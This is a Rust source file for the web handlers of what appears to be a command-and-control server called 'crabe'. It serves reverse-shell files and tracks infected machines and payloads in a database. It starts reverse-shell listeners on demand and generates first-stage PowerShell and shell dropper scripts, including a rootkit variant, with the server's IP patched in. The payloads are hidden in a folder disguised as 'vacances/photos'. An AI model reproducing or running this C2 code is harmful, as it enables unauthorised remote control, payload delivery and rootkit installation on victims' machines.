
use axum::Json;
use axum::extract;
use std::path::PathBuf;
use std::fs;
use crate::events::Events;
use axum::extract::ConnectInfo;
use crate::rev_shell_handler::listen;
use crate::Database;
use axum::extract::Path;
use axum::response::IntoResponse;
use hyper::StatusCode;
use axum::response::Response;
use crate::rev_shell_handler::get_available_port;
use serde::Deserialize;
use std::net::UdpSocket;

// Struct only use for sending cmd to shells
#[derive(Deserialize)]
pub struct Command {
    pub cmd: String,
}


pub async fn list_shell() -> Json<Vec<String>>
{
    // list file in the ./shell directory that countain revshell as text file
    // return it as json
    let paths = fs::read_dir("./shell/").unwrap();
    let file_names = paths.map(|entry| entry.unwrap().file_name().into_string().unwrap()).collect::<Vec<_>>();
    Json(file_names)

}

pub async fn get_shell(extract::Path(shell_name): extract::Path<PathBuf>) -> String
{
    // read the content of a file in the shell directory
    let path = PathBuf::from("./shell/").join(shell_name.clone());
    let content = fs::read_to_string(path).unwrap();
    content
}

pub async fn fetch_payload_by_id(Path(payload_id): Path<u64>) -> impl IntoResponse {
    let db = Database::new("crabe.db").unwrap();

    match db.fetch_payload_by_id(payload_id) {
        Ok(payload) => Json(payload).into_response(),
        Err(e) => {
            eprintln!("Error fetching payload: {:?}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Error fetching payload").into_response()
        }
    }
}

pub async fn delete_payload_by_id(Path(payload_id): Path<u64>) -> impl IntoResponse {
    let db = Database::new("crabe.db").unwrap();

    match db.delete_payload_by_id(payload_id) {
        Ok(payload) => Json(payload).into_response(),
        Err(e) => {
            eprintln!("Error fetching payload: {:?}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Error fetching payload").into_response()
        }
    }
}

pub async fn count_by_os() -> impl IntoResponse {
    let db = Database::new("crabe.db").unwrap();

    match db.count_by_os() {
        Ok(payload) => Json(payload).into_response(),
        Err(e) => {
            eprintln!("Error fetching payload: {:?}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Error fetching payload").into_response()
        }
    }
}

pub async fn list_payload() -> Json<Vec<String>>
{
    // list file in the ./shell directory that countain revshell as text file
    // return it as json
    let paths = fs::read_dir("./vacances/photos/").unwrap();
    let file_names = paths.map(|entry| entry.unwrap().file_name().into_string().unwrap()).collect::<Vec<_>>();
    Json(file_names)

}

pub async fn fetch_machine_by_id(Path(machine_id): Path<u64>) -> impl IntoResponse {
    let db = Database::new("crabe.db").unwrap();

    match db.fetch_machine_by_id(machine_id) {
        Ok(payload) => Json(payload).into_response(),
        Err(e) => {
            eprintln!("Error fetching payload: {:?}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Error fetching machine").into_response()
        }
    }
}

// Let's create the function linked to route where the payload will get
// the open-port and launch a listener on this specific port
pub async fn get_open_port() ->  Response {
    let port = get_available_port(4000, 5000);
    // Launching the listener for this specific port
    println!("Started to listen on the port {}", port);
    listen(port);
    port.to_string().into_response()
}

fn get_local_ip() -> String {

    let socket = match UdpSocket::bind("0.0.0.0:0") 
    {
        Ok(s) => s,
        Err(_) => panic!("Error binding socket"),
    };


    if let Err(_) = socket.connect("8.8.8.8:80") 
    {
        panic!("Error connecting to google");
    }

    let local_addr = match socket.local_addr() 
    {
        Ok(addr) => addr,
        Err(_) => panic!("Error getting local ip"),
    };

    local_addr.ip().to_string()
}

pub async fn create_first_stage(ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>, axum::extract::Path((bin_name, os)): axum::extract::Path<(String, String)>) -> String 
{
    if os == "windows" 
    {
        let ip = get_local_ip();
        let script = fs::read_to_string("./vacances/photos/crabec2.ps1");

        if let Ok(mut new_script) = script {
            new_script = new_script.replace("$bin_name = \"test\"", &format!("$bin_name = \"{}\"", bin_name));
            new_script = new_script.replace("$ip = \"0.0.0.0\"", &format!("$ip = \"{}\"", ip));
            
            let ip_machine = addr.ip().to_string();
            let _ = Events::new
            (
                6,
                Some(ip_machine),
                None,
                Some(bin_name),
                None,
            ).log_to_file();

            return new_script;
        } else {
            return "Error reading script file".to_string();
        }
    }
    else if os == "linux" {
        let ip = get_local_ip();
        let mut script = fs::read_to_string("./vacances/photos/crabec2.sh");
        
        if bin_name == "rk.zip"
        {
          	script = fs::read_to_string("./vacances/photos/crabec2RK.sh");
        }
        if let Ok(mut new_script) = script {
            new_script = new_script.replace("ip=\"0.0.0.0\"", &format!("ip=\"{}\"", ip));
            new_script = new_script.replace("bin_name=\"test\"", &format!("bin_name=\"{}\"", bin_name));
            //let bin_name = "chicken rootkit".to_string();
            let ip_machine = addr.ip().to_string();
            let _ = Events::new
            (
                6,
                Some(ip_machine),
                None,
                Some(bin_name),
                None,
            ).log_to_file();

            return new_script;
        } else {
            return "Error reading script file".to_string();
        }
    }
    "Error".to_string()
}